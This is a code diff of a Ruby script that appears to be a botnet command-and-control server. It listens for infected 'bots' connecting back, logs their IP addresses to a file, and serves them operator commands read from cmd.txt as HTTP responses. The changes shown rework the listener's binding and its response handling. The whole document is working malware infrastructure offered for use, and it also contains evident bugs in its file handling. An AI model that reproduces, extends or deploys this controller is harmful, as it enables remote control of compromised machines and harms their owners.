@@ -1,11 +1,21 @@
 #!/usr/bin/env ruby
-
-
 require 'socket'
 
+def local_ip
+  orig = Socket.do_not_reverse_lookup
+  Socket.do_not_reverse_lookup = true # turn off reverse DNS resolution temporarily
+  UDPSocket.open do |s|
+    s.connect '64.233.187.99', 1 #google
+    s.addr.last
+  end
+ensure
+  Socket.do_not_reverse_lookup = orig
+end
+
 begin
-  port = 6666  # CHANGE THIS
+  port = 8080  # This has to be the same port that the bot is connecting back to
   masterport = 45678
+  locip = local_ip  # If we aren't connected to the outernet
   puts "
   _______ _______ ______ _______
   |     __|       |   __ \\   _   |
@@ -14,9 +24,9 @@ begin
 
   Made with <3 by AM-77
 
-  To stop the server, type \`pkill ruby'\n\n"
-  puts "[!] Starting bot listener on port #{port}"
-  server = TCPServer.new("0.0.0.0", port)  # Change this to the port you have the client connecting to
+  To stop the server, type CTRL+C\n\n"
+  puts "[!] Starting bot listener on #{locip}:#{port}"
+  server = TCPServer.new(locip, port)
 
   # Always override previous file
   cmdf = File.new("cmd.txt", 'w')
@@ -27,31 +37,33 @@ begin
 
   bot_file = File.new("bots.txt", 'a+')
 
+  # Create the HTTP response
+  cmd_file_read = File.new("cmd.txt", 'r')
+
+  response = cmd_file_read.read
+
+  res =  "HTTP/1.1 200 OK\r\n"
+  res += "Content-Type: text/plain\r\n"
+  res += "Content-Length: #{response.bytesize}\r\n"
+  res += "Connection: close\r\n"
+  res += "\r\n"
+  res += response
+
   loop do
     Thread.start(server.accept) do |socket|
 
-      if File.readlines("bots.txt").grep(/socket.peeraddr[3]/).any?
-        puts "[*] Conn from prev addr"
-        next
+      # Write response but don't write to bot file
+      if File.readlines("bots.txt").grep(/#{socket.peeraddr[3]}/).any?
+        socket.write res
+        socket.close
       end
-      puts "[*] New connection from #{socket.peeraddr[3]}"
+
+      puts "[*] New bot connection from #{socket.peeraddr[3]}\n"
       bot_file.write("#{socket.peeraddr[3]}\n")
       bot_file.close
 
       request = socket.gets
       STDERR.puts request
-
-
-      cmd_file_read = File.new("cmd.txt", 'r')
-
-      response = cmd_file_read.read
-
-      res =  "HTTP/1.1 200 OK\r\n"
-      res += "Content-Type: text/plain\r\n"
-      res += "Content-Length: #{response.bytesize}\r\n"
-      res += "Connection: close\r\n"
-      res += "\r\n"
-      res += response
 
       socket.print res
 
